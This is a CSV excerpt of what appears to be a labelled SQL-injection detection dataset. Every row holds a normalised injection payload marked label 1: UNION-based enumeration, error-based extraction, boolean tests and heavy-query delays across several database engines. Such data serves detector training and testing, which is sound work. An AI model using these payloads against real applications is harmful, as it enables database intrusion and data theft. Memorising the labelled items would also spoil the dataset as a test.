row_index,payload_norm,label,sqli_type_hint
7050,"1' and elt ( 4249 = 4249,7259 ) and 'nsbj' like 'nsbj",1,
7051,"1%"" ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""%"" = """,1,
7052,1%' and 2006 = 2006,1,
7053,"-6200' ) ) as jjpz where 4490 = 4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",1,
7054,"-6520%"" ) order by 1#",1,
7055,-9673 ) or 8571 = 8571--,1,
7056,1'|| ( select 'vasx' where 4770 = 4770 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||',1,
7057,1 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- slje,1,
7058,1 ) as bzuh where 8041 = 8041 and 6307 = 9200#,1,
7059,"-9152"" ) ) as avga where 3825 = 3825 order by 1#",1,
7060,"1"" ) as pxdq where 2236 = 2236 and 2006 = 2006",1,
7061,"1"" ) ) as pqbs where 4409 = 4409",1,
7062,"-7678 ) ) ) union all select 2622,2622,2622,2622,2622,2622,2622,2622--",1,
7063,"-9015%"" ) union all select 6948,6948--",1,
7064,"1%' ) ) union all select null,null,null,null,null,null#",1,
7065,"1 ) where 1270 = 1270 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,
7066,"1"" or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
7067,-9653' ) where 2705 = 2705 or 9323 = 9323#,1,
7068,"1 ) union all select null,null,null,null,null,null,null,null,null,null#",1,
7069,"-3872%"" ) ) ) union all select 1637,1637,1637,1637,1637#",1,
7070,1'+ ( select 'rpds' where 5870 = 5870 and 4595 = 4595#,1,
7071,"1'+ ( select 'vabj' where 7178 = 7178 union all select null,null,null,null,null#",1,
7072,"1 ) ) as vzso where 8541 = 8541 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
7073,"1%"" ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""%"" = """,1,
7074,"1"" where 4684 = 4684 union all select null,null,null,null#",1,
7075,1' where 1628 = 1628,1,
7076,"1' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'dfsj' = 'dfsj",1,
7077,"1 ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 9474 = 9474",1,
7078,"1%"" ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
7079,"1"" ) where 8390 = 8390",1,
